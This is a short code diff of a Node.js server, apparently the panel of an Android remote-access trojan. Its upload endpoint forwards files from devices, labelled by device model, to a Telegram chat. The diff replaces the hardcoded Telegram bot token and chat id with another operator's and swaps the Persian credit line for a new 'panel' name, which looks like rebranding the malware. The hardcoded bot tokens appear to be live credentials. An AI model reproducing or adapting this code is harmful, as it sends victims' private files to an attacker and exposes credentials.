@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8085185238:AAHN-VE9n3KR_-XR1eRuJVjCsuMY31YaGMo'
-const id = '7582447455'
+const token = '8471008191:AAEQP5cFC-VqhNOAGZif-Q5KX5dTJJzP6k4'
+const id = '1002446772396'
 const address = 'https://www.google.com'
 
 const app = express();
@@ -32,7 +32,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
             caption: `°• پیام از <b>${req.headers.model}</b> دستگاه
-            📍CR :〔@LXNETU〕`,
+            📍CR :〔پنل حاج وحید نارویی〕`,
             parse_mode: "HTML"
         },
         {
